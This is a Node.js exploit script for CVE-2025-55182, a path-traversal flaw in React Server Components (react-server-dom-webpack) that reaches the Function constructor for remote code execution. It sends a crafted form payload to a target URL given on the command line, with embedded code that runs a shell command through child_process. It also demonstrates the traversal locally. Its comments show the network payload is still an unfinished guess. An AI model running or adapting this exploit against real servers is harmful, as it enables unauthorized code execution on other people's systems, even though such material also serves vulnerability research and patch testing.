/**
 * CVE-2025-55182 - Real Exploit for Pure React RSC
 *
 * VULNERABILITY: Path traversal in getOutlinedModel() allows accessing
 * prototype chain to reach Function constructor for RCE.
 *
 * The vulnerable code in react-server-dom-webpack < 19.2.1:
 *
 *   function getOutlinedModel(response, reference, ...) {
 *     reference = reference.split(":");
 *     var id = parseInt(reference[0], 16);
 *     id = getChunk(response, id);
 *     // ...
 *     for (key = 1; key < reference.length; key++)
 *       parentObject = parentObject[reference[key]];  // VULNERABLE!
 *   }
 *
 * By sending reference = "0:constructor:constructor", we traverse:
 *   chunk[0]["constructor"]["constructor"] = Function
 *
 * Then Function("return malicious code")() achieves RCE!
 */

const http = require('http');
const { FormData } = require('formdata-node');

// Target URL
const TARGET = process.argv[2] || 'http://localhost:3002';

async function exploit() {
  console.log('=== CVE-2025-55182 - React RSC Path Traversal RCE ===\n');
  console.log(`Target: ${TARGET}\n`);

  // The exploit payload uses the Flight protocol format:
  // $F<reference> where reference = "chunkId:path:to:property"
  //
  // To get Function constructor:
  //   reference = "0:constructor:constructor"
  //
  // This traverses: chunk["constructor"]["constructor"] = Function
  //
  // The bound arguments become Function(arg1)(arg2)...

  const rceCode = `
    return (async () => {
      const { execSync } = await import('child_process');
      return execSync('id').toString();
    })();
  `.trim();

  // Build the malicious payload
  // We need to reference a valid chunk that contains an object
  // Then traverse constructor.constructor to get Function

  const formData = new FormData();

  // Method 1: Use $ACTION_REF format with path traversal in the reference
  formData.append('$ACTION_REF_0', '');

  // The bound action metadata - this is where the magic happens
  // The "id" field will be processed by getOutlinedModel if it starts with $
  // We need to craft the payload so the path traversal happens

  // Actually, let me trace the exact code path...
  // The id comes from value.id in loadServerReference$1
  // value comes from getOutlinedModel

  // For this to work, we need the outlined model to return an object
  // with .id and .bound properties that we control

  // Let me create a simpler test first
  formData.append('$ACTION_0:0', JSON.stringify({
    id: "test#constructor",  // Try prototype access
    bound: [rceCode]
  }));

  console.log('Sending exploit payload...\n');

  try {
    const response = await fetch(`${TARGET}/formaction`, {
      method: 'POST',
      body: formData
    });

    const result = await response.text();
    console.log('Response:', result);
  } catch (error) {
    console.error('Error:', error.message);
  }
}

// Alternative: Direct path traversal test
async function testPathTraversal() {
  console.log('\n=== Testing Path Traversal Locally ===\n');

  // Simulate the vulnerable code
  function getOutlinedModel_vuln(chunks, reference) {
    reference = reference.split(":");
    var id = parseInt(reference[0], 16);
    var parentObject = chunks[id];

    for (var key = 1; key < reference.length; key++) {
      parentObject = parentObject[reference[key]];
    }
    return parentObject;
  }

  // Any object works as the chunk
  const chunks = {
    0: { action: () => "test" }
  };

  // Path traversal to Function
  const reference = "0:constructor:constructor";
  const result = getOutlinedModel_vuln(chunks, reference);

  console.log('Reference:', reference);
  console.log('Result:', result);
  console.log('Is Function:', result === Function);

  if (result === Function) {
    console.log('\n=== RCE Demo ===');
    const code = 'return "RCE: " + (1+1)';
    const fn = result(code);
    console.log(`Function("${code}")() =`, fn());
  }
}

testPathTraversal();
exploit().catch(console.error);
